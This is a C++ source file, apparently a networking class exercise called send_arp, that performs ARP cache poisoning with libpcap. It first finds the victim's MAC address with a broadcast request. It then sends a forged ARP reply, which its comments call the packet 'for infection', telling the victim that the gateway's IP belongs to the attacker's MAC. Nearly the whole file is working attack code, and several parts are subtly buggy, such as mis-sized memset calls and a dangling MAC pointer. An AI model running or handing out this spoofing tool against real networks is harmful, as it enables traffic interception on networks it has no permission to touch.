#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
// network interface
#include <sys/types.h>
#include <ifaddrs.h>
// get mac address of host(attacker) PC
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <iostream>
#pragma pack(1)  // if it is not imported, the char type is allocated as 4 bytes

struct ether_header
{
        unsigned char ether_dhost[6];
        unsigned char ether_shost[6];
        unsigned short ether_type;
};

struct arp_header
{
    u_short  ar_hrd;     // Hardware type
    u_short  ar_pro;     // Protocol type
    u_char   ar_hln;     // Hardware size
    u_char   ar_pln;     // Protocal size
    u_short  ar_op;      // Opcode code
    u_char   ar_sha[6];  // Sender MAC
    struct in_addr ip_src;  // Sender IP
    u_char   ar_tha[6];  // Target mac
    struct in_addr ip_dst;  // Target IP
    //constructor
    arp_header(){ 

    }
};
struct eth_arp{
    struct ether_header eh;
    struct arp_header ah;
    //constructor part
    eth_arp(){

    }
};
int getNetworkInterface();
u_char* getMacAddressOfAttacker(char* interfaceChoosed);
u_char* makeBroadCastingPacket(u_char* hostMACAddr, char* hostIPAddr, char* senderIPAddr);
u_char* makeReplyPacket(u_char* attackerMACAddr, u_char* senderMacAddr, char* senderIPAddr, char* targetIPAddr);
void usage() {
  printf("syntax: send_arp <sender ip> <target ip>\n");
  printf("sample: send_arp 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]){
    // destination : victim mac
    // source : attackers mac
    // operation : arp reply
    // sender HA : attackers mac
    // sender ip : gateway ip
    // target ha : victims mac
    // target ip : victims ip

    if (argc != 3) {
         usage();
         return -1;
    }
    char* senderIPAddr;
    char* targetIPAddr;
    senderIPAddr = argv[1];// 172.20.10.2
    targetIPAddr = argv[2];// 172.20.10.1
    
    
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i = 0; // the number of devices
    int inum = 0; // selected device
    char errbuf[PCAP_ERRBUF_SIZE];

    // Retrieve the network device list on the local machine
    // print the error message of failing pcap_findalldevs
    if(pcap_findalldevs(&alldevs, errbuf)<0){
        printf("pcap_findalldevs error, %s\n",errbuf);
        return -1;
    }
    // print the all devices and description
    for(d=alldevs; d; d=d->next){
        printf("%p : %d. %s", d, ++i, d->name);
        if(d->description){
            printf(" (%s)", d->description);
        }
        printf("\n");
    }
    // if there is no device
    if(i==0){
        printf("there is no device\n");
        return -1;
    }
    printf("Enter the device number (1-%d) : ",i);
    scanf("%d",&inum);
    if(inum < 1 || inum > i){
        printf("the device number is out of range\n");
        pcap_freealldevs(alldevs);
        return -1;
    }
    // get the selected device
    for(d=alldevs,i=0;i<inum-1;d=d->next,i++);

    // get the handle of the selected network device
    pcap_t* handle = pcap_open_live(d->name, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", d->name, errbuf);
        return -1;
    }
    // get the MAC address of Host PC
    u_char* macAddr;
    u_char attackerMACAddr[6];
    macAddr = getMacAddressOfAttacker(d->name);
    attackerMACAddr[0]=macAddr[0];
    attackerMACAddr[1]=macAddr[1];
    attackerMACAddr[2]=macAddr[2];
    attackerMACAddr[3]=macAddr[3];
    attackerMACAddr[4]=macAddr[4];
    attackerMACAddr[5]=macAddr[5];
    printf("attacker Mac addr : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , attackerMACAddr[0], attackerMACAddr[1], attackerMACAddr[2], attackerMACAddr[3], attackerMACAddr[4], attackerMACAddr[5]);
    // get the IP address of Host PC
    char* ipAddr;
    for(pcap_addr_t* a=d->addresses; a!=NULL; a=a->next) {
        if(a->addr->sa_family == AF_INET){
            ipAddr = inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr);
            printf("attacker IP addr : %s\n", ipAddr);
        }
    }
    // make BroadCast Packet
    printf("make the broadcast packet\n");
    u_char* broadCastPacket;
    broadCastPacket = makeBroadCastingPacket(attackerMACAddr, ipAddr, senderIPAddr);
    
    printf("the broadcast packet to get the mac of sender(victim)\n");
    for(int i=0;i<42;i++){
        if(i!=0 && i%16 == 0)
            printf("\n");
        printf("%02x ",*(broadCastPacket+i));
    }
    printf("\n");

    // send the broadCast packet until get the appropriate reply from sender(victim)
    int cnt=0;
    int replyFromSender=0;
    u_char senderMac[6];
    // to send the request repeatedly due to the possibility of the broadcast packet loss
    while(true){
        if(pcap_sendpacket(handle,broadCastPacket,42)!=0){
            printf("send broadcast packet error\n");
            return -1;
        }
        // check the reply packet from sender
        while(true){
            struct pcap_pkthdr* header;
            const u_char* pkt_data;
            struct eth_arp* ea;
            int res = pcap_next_ex(handle, &header, &pkt_data);
            if (res == 0) break; // change 'continue' to 'break'. If there is no packet, send the request packet one more
            if (res == -1 || res == -2) break;
            ea = (struct eth_arp *)pkt_data;
            if(htons(ea->eh.ether_type) == 0x0806){ // arp packet
                // printf("the sender ip : %s\n",inet_ntoa(ea->ah.ip_src));
                // printf("the input ip : %s\n", senderIPAddr);
                if(memcmp((void*)inet_ntoa(ea->ah.ip_src),(void*)senderIPAddr,4)==0){
                    // printf("the ip of sender we want : %s\n",inet_ntoa(ea->ah.ip_src));
                    memcpy(senderMac,ea->eh.ether_shost,6);
                    printf("victim Mac addr : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , senderMac[0], senderMac[1], senderMac[2], senderMac[3], senderMac[4], senderMac[5]);
                    replyFromSender = 1;
                    break;    
                }
            }
        }
        if(replyFromSender==1)
            break;
    }
    // make the reply packet for infection
    printf("make the reply packet\n");
    u_char* replyPacket;
    replyPacket = makeReplyPacket(attackerMACAddr, senderMac, senderIPAddr, targetIPAddr);

    printf("the reply packet for infection\n");
    for(int i=0;i<42;i++){
        if(i!=0 && i%16 == 0)
            printf("\n");
        printf("%02x ",*(replyPacket+i));
    }
    printf("\n");
    // send the reply packet
    if(pcap_sendpacket(handle,replyPacket,42)!=0){
        printf("send the reply packet error\n");
        return -1;
    }else{
        printf("Sending the reply packet for infection is success\n");
    }

    // free(macAddr);
    // free(ipAddr);
    pcap_freealldevs(alldevs);
    return 0;
}

int getNetworkInterface(){
    struct ifaddrs *addrs,*tmp;
 
    getifaddrs(&addrs);
    tmp = addrs;
    // printf("%s\n", addrs->ifa_name);
    while (tmp)
    {   
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_PACKET){
            // printf("%s\t%c\n", tmp->ifa_name, tmp->ifa_addr->sa_data[0]);
            printf("%s\n", tmp->ifa_name);
        }
 
        tmp = tmp->ifa_next;
    }   
    freeifaddrs(addrs);
    return 0;
}
u_char* getMacAddressOfAttacker(char* interfaceChoosed){
    int fd;
    struct ifreq ifr;
    // char *iface = "ens33";
    char *iface = interfaceChoosed;
    u_char *mac = (u_char*)malloc(sizeof(u_char));
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
 
    ioctl(fd, SIOCGIFHWADDR, &ifr);
 
    close(fd);
     
    mac = (u_char *)ifr.ifr_hwaddr.sa_data;

    //display mac address
    // printf("Attacker(Host) Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
    return mac;
}
u_char* makeBroadCastingPacket(u_char* hostMACAddr, char* hostIPAddr, char* senderIPAddr){
    
    // create packet data ================================
    u_char* packet = (u_char*)malloc(sizeof(u_char) * 42);
    memset(packet, 0, sizeof(packet)); // initialize
    struct ether_header eh;
    struct arp_header ah;

    int length=0; // to point the location of packet

    // fill in ethernet header ===========================
    eh.ether_dhost[0] = 0xFF;
    eh.ether_dhost[1] = 0xFF;
    eh.ether_dhost[2] = 0xFF;
    eh.ether_dhost[3] = 0xFF;
    eh.ether_dhost[4] = 0xFF;
    eh.ether_dhost[5] = 0xFF;

    eh.ether_shost[0] = hostMACAddr[0];
    eh.ether_shost[1] = hostMACAddr[1];
    eh.ether_shost[2] = hostMACAddr[2];
    eh.ether_shost[3] = hostMACAddr[3];
    eh.ether_shost[4] = hostMACAddr[4];
    eh.ether_shost[5] = hostMACAddr[5];

    eh.ether_type = htons(0x0806); // Address resolution protocol

    // fill in ARP header ================================
    ah.ar_hrd = htons(0x0001); // ethernet 1
    ah.ar_pro = htons(0x0800); // IPv4
    ah.ar_hln = 0x06; // 6
    ah.ar_pln = 0x04; // 4
    ah.ar_op = htons(0x0001); // arp request

    ah.ar_sha[0] = hostMACAddr[0];
    ah.ar_sha[1] = hostMACAddr[1];
    ah.ar_sha[2] = hostMACAddr[2];
    ah.ar_sha[3] = hostMACAddr[3];
    ah.ar_sha[4] = hostMACAddr[4];
    ah.ar_sha[5] = hostMACAddr[5];

    int success = inet_aton(hostIPAddr,&ah.ip_src);
    if(!success){
        printf("inet_aton error\n");
    }else{
        // printf("sedner ip(attacker ip) : %s\n",inet_ntoa(ah.ip_src));
    }

    ah.ar_tha[0] = 0x00;
    ah.ar_tha[1] = 0x00;
    ah.ar_tha[2] = 0x00;
    ah.ar_tha[3] = 0x00;
    ah.ar_tha[4] = 0x00;
    ah.ar_tha[5] = 0x00;

    success = inet_aton(senderIPAddr,&ah.ip_dst);
    if(!success){
        printf("inet_aton error\n");
    }else{
        // printf("target ip(victim ip) : %s\n",inet_ntoa(ah.ip_dst));
    }

    // copy ethernet, arp header to packet
    memcpy(packet, &eh, sizeof(eh));
    length += sizeof(eh);
    memcpy(packet+length, &ah, sizeof(ah));
    length += sizeof(ah);
    
    // printf("the packet\n");
    // for(int i=0;i<42;i++){
    //     if(i!=0 && i%16 == 0)
    //         printf("\n");
    //     printf("%02x ",*(packet+i));
    // }
    // printf("\n");
    return packet;
}

u_char* makeReplyPacket(u_char* attackerMACAddr, u_char* senderMacAddr, char* senderIPAddr, char* targetIPAddr){
    // create packet data ================================
    u_char* packet = (u_char*)malloc(sizeof(u_char) * 42);
    memset(packet, 0, sizeof(packet)); // initialize
    struct ether_header eh;
    struct arp_header ah;

    int length=0; // to point the location of packet

    // fill in ethernet header ===========================
    eh.ether_dhost[0] = senderMacAddr[0];
    eh.ether_dhost[1] = senderMacAddr[1];
    eh.ether_dhost[2] = senderMacAddr[2];
    eh.ether_dhost[3] = senderMacAddr[3];
    eh.ether_dhost[4] = senderMacAddr[4];
    eh.ether_dhost[5] = senderMacAddr[5];

    eh.ether_shost[0] = attackerMACAddr[0];
    eh.ether_shost[1] = attackerMACAddr[1];
    eh.ether_shost[2] = attackerMACAddr[2];
    eh.ether_shost[3] = attackerMACAddr[3];
    eh.ether_shost[4] = attackerMACAddr[4];
    eh.ether_shost[5] = attackerMACAddr[5];

    eh.ether_type = htons(0x0806); // Address resolution protocol

    // fill in ARP header ================================
    ah.ar_hrd = htons(0x0001); // ethernet 1
    ah.ar_pro = htons(0x0800); // IPv4
    ah.ar_hln = 0x06; // 6
    ah.ar_pln = 0x04; // 4
    ah.ar_op = htons(0x0002); // arp reply

    ah.ar_sha[0] = attackerMACAddr[0];
    ah.ar_sha[1] = attackerMACAddr[1];
    ah.ar_sha[2] = attackerMACAddr[2];
    ah.ar_sha[3] = attackerMACAddr[3];
    ah.ar_sha[4] = attackerMACAddr[4];
    ah.ar_sha[5] = attackerMACAddr[5];

    int success = inet_aton(targetIPAddr,&ah.ip_src);
    if(!success){
        printf("inet_aton error\n");
    }else{
        // printf("sender ip(gateway ip) : %s\n",inet_ntoa(ah.ip_src));
    }

    ah.ar_tha[0] = senderMacAddr[0];
    ah.ar_tha[1] = senderMacAddr[1];
    ah.ar_tha[2] = senderMacAddr[2];
    ah.ar_tha[3] = senderMacAddr[3];
    ah.ar_tha[4] = senderMacAddr[4];
    ah.ar_tha[5] = senderMacAddr[5];

    success = inet_aton(senderIPAddr,&ah.ip_dst);
    if(!success){
        printf("inet_aton error\n");
    }else{
        // printf("target ip(victim ip) : %s\n",inet_ntoa(ah.ip_dst));
    }

    // copy ethernet, arp header to packet
    memcpy(packet, &eh, sizeof(eh));
    length += sizeof(eh);
    memcpy(packet+length, &ah, sizeof(ah));
    length += sizeof(ah);
    
    // printf("the reply packet for infection\n");
    // for(int i=0;i<42;i++){
    //     if(i!=0 && i%16 == 0)
    //         printf("\n");
    //     printf("%02x ",*(packet+i));
    // }
    // printf("\n");
    return packet;
}
